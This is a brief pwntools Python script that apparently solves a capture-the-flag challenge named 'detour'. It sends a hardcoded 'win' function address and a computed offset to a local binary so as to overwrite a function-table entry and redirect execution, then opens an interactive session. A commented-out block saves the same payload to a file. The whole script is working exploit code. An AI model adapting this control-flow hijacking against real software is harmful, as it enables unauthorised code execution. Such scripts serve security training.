from pwn import *

p = process('./detour')

win_adr = 0x401209
plt_adr = 0x4033c8
base = 0x403430

print(p.recv())
print(str(win_adr))
p.sendline(str(win_adr).encode())
print(p.recv())
print(str(plt_adr-base))
p.sendline(str(plt_adr-base).encode())
p.interactive()

'''
with open('payload', 'wb') as f:
    f.write(p64(win_adr) + b'\n')
    f.write(str(plt_adr-base).encode() + b'\n')
'''
